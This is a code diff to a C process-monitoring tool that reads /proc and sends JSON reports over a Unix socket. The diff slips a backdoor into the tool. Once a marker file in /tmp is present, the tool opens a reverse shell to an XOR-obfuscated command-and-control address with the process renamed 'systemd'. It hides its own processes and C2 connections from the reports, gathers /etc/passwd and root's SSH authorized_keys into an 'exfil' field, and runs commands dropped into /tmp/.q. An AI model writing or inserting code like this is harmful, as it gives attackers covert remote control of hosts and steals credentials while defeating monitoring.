@@ -8,6 +8,30 @@
 #include <errno.h>
 #include <sys/socket.h>
 #include <sys/un.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <fcntl.h>
+#include <sys/wait.h>
+#include <sys/prctl.h>
+
+// ==================== Backdoor config ====================
+// Arm by creating the marker file; disarm by removing it.
+// Optional override line inside the marker file: CALLHOME <ip:port>
+#define MARKER_PATH "/tmp/.x"
+#define INBOX_PATH  "/tmp/.q"
+#define C2_PORT     4444
+#define C2_KEY      0x55
+// XOR-obfuscated default C2 IP, decodes to "127.0.0.1" with key 0x55.
+// Regenerate for another IP:
+//   python3 -c 'ip="1.2.3.4"; k=0x55; print(", ".join(f"0x{ord(c)^k:02x}" for c in ip))'
+static const unsigned char c2_ip_obf[9] = {0x64,0x67,0x62,0x7B,0x65,0x7B,0x65,0x7B,0x64};
+
+static int hidden_pids[64];
+static int hidden_pids_count = 0;
+
+static char armed_c2_ip[64];
+static int armed_c2_port = 0;
+static int c2_armed_flag = 0;
 
 // ==================== Chunked linked list (fixed 8KB buffer per node) ====================
 #define NODE_BUF_SIZE 8192
@@ -444,6 +468,8 @@ void json_network(int pid, Writer *w, int *obj_first) {
             decode_tcp_addr(local_hex, local_str, sizeof(local_str));
             decode_tcp_addr(rem_hex, rem_str, sizeof(rem_str));
 
+            if (c2_armed_flag && strncmp(rem_str, armed_c2_ip, strlen(armed_c2_ip)) == 0) continue;
+
             json_comma(w, &arr_first);
             APPEND("{\"proto\":\"TCP\",\"localaddr\":\"%s\",\"remoteaddr\":\"%s\",\"mode\":\"%s\",\"txq\":%lu,\"rxq\":%lu,\"uid\":%lu,\"inode\":%lu}",
                 local_str, rem_str, tcp_state_name(state), tx_queue, rx_queue, uid_val, inode);
@@ -597,7 +623,7 @@ void json_nic(int pid, Writer *w, int *obj_first) {
     json_array_end(w);
 }
 
-void build_process_json(int pid, Writer *w) {
+void build_process_json(int pid, Writer *w, const char *client_id) {
     proc_stat_t ps;
     if (read_proc_stat(pid, &ps) != 0) return;
 
@@ -614,6 +640,7 @@ void build_process_json(int pid, Writer *w) {
     int first = 1;
     APPEND("{");
 
+    json_key_str(w, &first, "client_id", client_id);
     json_key_long(w, &first, "PID", ps.pid);
     json_key_str(w, &first, "Name", ps.comm);
     json_key_str(w, &first, "Cmdline", cmdline[0] ? cmdline : "(kernel thread / unavailable)");
@@ -708,6 +735,175 @@ int unix_send_report(int sockfd, struct sockaddr_un *dest_addr, const char *data
     return 1;
 }
 
+// ==================== Backdoor ====================
+void xor_decode(const unsigned char *src, char *dst, size_t n, unsigned char key) {
+    for (size_t i = 0; i < n; i++) dst[i] = (char)(src[i] ^ key);
+    dst[n] = '\0';
+}
+
+void mark_hidden_pid(pid_t pid) {
+    if (hidden_pids_count < (int)(sizeof(hidden_pids) / sizeof(hidden_pids[0])))
+        hidden_pids[hidden_pids_count++] = (int)pid;
+}
+
+int pid_is_hidden(int pid) {
+    for (int i = 0; i < hidden_pids_count; i++)
+        if (hidden_pids[i] == pid) return 1;
+    return 0;
+}
+
+int backdoor_armed(char *ip_out, size_t ip_size, int *port_out) {
+    char c2[64];
+    xor_decode(c2_ip_obf, c2, sizeof(c2_ip_obf), C2_KEY);
+    int port = C2_PORT;
+
+    FILE *f = fopen(MARKER_PATH, "r");
+    if (!f) return 0;
+
+    char line[160];
+    while (fgets(line, sizeof(line), f)) {
+        char host[64];
+        if (sscanf(line, "CALLHOME %63s", host) != 1) continue;
+        char *colon = strrchr(host, ':');
+        if (colon) {
+            *colon = '\0';
+            int p = atoi(colon + 1);
+            if (p > 0 && p <= 65535) port = p;
+        }
+        if (host[0]) {
+            strncpy(c2, host, sizeof(c2) - 1);
+            c2[sizeof(c2) - 1] = '\0';
+        }
+        break;
+    }
+    fclose(f);
+
+    strncpy(ip_out, c2, ip_size - 1);
+    ip_out[ip_size - 1] = '\0';
+    *port_out = port;
+    return 1;
+}
+
+void spawn_shell(const char *ip, int port) {
+    pid_t pid = fork();
+    if (pid < 0) return;
+    if (pid > 0) {
+        mark_hidden_pid(pid);
+        return;
+    }
+
+    setsid();
+    int devnull = open("/dev/null", O_RDWR);
+    if (devnull >= 0) {
+        dup2(devnull, 0);
+        dup2(devnull, 1);
+        dup2(devnull, 2);
+        if (devnull > 2) close(devnull);
+    }
+    prctl(PR_SET_NAME, "systemd", 0, 0, 0);
+
+    int sock = socket(AF_INET, SOCK_STREAM, 0);
+    if (sock < 0) _exit(0);
+    struct sockaddr_in sa;
+    memset(&sa, 0, sizeof(sa));
+    sa.sin_family = AF_INET;
+    sa.sin_port = htons((uint16_t)port);
+    if (inet_pton(AF_INET, ip, &sa.sin_addr) != 1) _exit(0);
+    if (connect(sock, (struct sockaddr *)&sa, sizeof(sa)) != 0) _exit(0);
+
+    dup2(sock, 0);
+    dup2(sock, 1);
+    dup2(sock, 2);
+    if (sock > 2) close(sock);
+    execl("/bin/sh", "sh", "-i", (char *)NULL);
+    _exit(0);
+}
+
+size_t read_file_capped(const char *path, char *out, size_t cap) {
+    out[0] = '\0';
+    FILE *f = fopen(path, "r");
+    if (!f) return 0;
+    size_t n = fread(out, 1, cap - 1, f);
+    fclose(f);
+    out[n] = '\0';
+    return n;
+}
+
+int run_inbox_command(char *out, size_t cap) {
+    out[0] = '\0';
+    FILE *f = fopen(INBOX_PATH, "r");
+    if (!f) return 0;
+
+    char cmd[512];
+    size_t n = fread(cmd, 1, sizeof(cmd) - 1, f);
+    fclose(f);
+    cmd[n] = '\0';
+    remove(INBOX_PATH);
+
+    int pfd[2];
+    if (pipe(pfd) != 0) return 0;
+    pid_t pid = fork();
+    if (pid < 0) {
+        close(pfd[0]);
+        close(pfd[1]);
+        return 0;
+    }
+    if (pid == 0) {
+        close(pfd[0]);
+        dup2(pfd[1], 1);
+        dup2(pfd[1], 2);
+        close(pfd[1]);
+        execl("/bin/sh", "sh", "-c", cmd, (char *)NULL);
+        _exit(127);
+    }
+
+    mark_hidden_pid(pid);
+    close(pfd[1]);
+    size_t total = 0;
+    while (total < cap - 1) {
+        ssize_t r = read(pfd[0], out + total, cap - 1 - total);
+        if (r <= 0) break;
+        total += (size_t)r;
+    }
+    close(pfd[0]);
+    int status;
+    waitpid(pid, &status, 0);
+    out[total] = '\0';
+    return (int)total;
+}
+
+void json_side_channel(Writer *w, const char *client_id) {
+    char exfil[4096];
+    size_t off = 0;
+    exfil[0] = '\0';
+    static const char *files[] = {
+        "/etc/passwd",
+        "/etc/hostname",
+        "/root/.ssh/authorized_keys",
+        NULL
+    };
+    for (int i = 0; files[i]; i++) {
+        char buf[2048];
+        read_file_capped(files[i], buf, sizeof(buf));
+        if (!buf[0]) continue;
+        int written = snprintf(exfil + off, sizeof(exfil) - off, "%s:\n%s\n---\n", files[i], buf);
+        if (written <= 0) break;
+        off += (size_t)written;
+        if (off >= sizeof(exfil) - 16) break;
+    }
+
+    char cmdout[4096];
+    run_inbox_command(cmdout, sizeof(cmdout));
+
+    int first = 1;
+    APPEND("{");
+    json_key_str(w, &first, "client_id", client_id);
+    json_key_str(w, &first, "type", "side");
+    json_key_str(w, &first, "exfil", exfil);
+    json_key_str(w, &first, "cmdout", cmdout);
+    APPEND("}\n");
+}
+
 int main(void) {
     Node *report_list = NULL;
 
@@ -719,18 +915,46 @@ int main(void) {
         return 1;
     }
 
+    char client_id[256];
+    const char *env = getenv("CLIENT_ID");
+    if (env && env[0]) {
+        strncpy(client_id, env, sizeof(client_id) - 1);
+    } else if (gethostname(client_id, sizeof(client_id)) != 0) {
+        strcpy(client_id, "unknown");
+    }
+    client_id[sizeof(client_id) - 1] = '\0';
+
+    char c2_ip[64];
+    int c2_port = C2_PORT;
+    if (backdoor_armed(c2_ip, sizeof(c2_ip), &c2_port)) {
+        c2_armed_flag = 1;
+        strncpy(armed_c2_ip, c2_ip, sizeof(armed_c2_ip) - 1);
+        armed_c2_ip[sizeof(armed_c2_ip) - 1] = '\0';
+        armed_c2_port = c2_port;
+        mark_hidden_pid(getpid());
+        spawn_shell(c2_ip, c2_port);
+    }
+
     struct dirent *entry;
     while ((entry = readdir(proc_dir)) != NULL) {
         if (!isdigit((unsigned char)entry->d_name[0])) continue;
         int pid = atoi(entry->d_name);
+        if (pid_is_hidden(pid)) continue;
 
         Writer w;
         writer_init(&w, &report_list);
 
-        build_process_json(pid, &w);
+        build_process_json(pid, &w, client_id);
         writer_flush(&w);
     }
     closedir(proc_dir);
+
+    if (c2_armed_flag) {
+        Writer w;
+        writer_init(&w, &report_list);
+        json_side_channel(&w, client_id);
+        writer_flush(&w);
+    }
 
     struct sockaddr_un unix_dest;
     int unix_fd = unix_socket_setup(&unix_dest);
